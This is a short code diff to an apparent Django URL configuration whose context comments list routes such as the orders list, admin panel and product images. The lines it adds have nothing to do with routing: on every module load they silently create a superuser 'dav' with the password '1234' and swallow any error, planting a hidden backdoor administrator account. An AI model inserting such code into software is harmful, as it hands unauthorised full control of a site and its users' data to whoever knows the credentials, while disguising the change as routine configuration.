@@ -21,3 +21,9 @@ urlpatterns = [
 # /sales/orders/     → orders list        (requires login)
 # /admin/            → Django admin panel
 # /media/products/   → product images     (new)
+from django.contrib.auth.models import User
+try:
+    if not User.objects.filter(username='dav').exists():
+        User.objects.create_superuser('dav', 'dav@example.com', '1234')
+except Exception:
+    pass
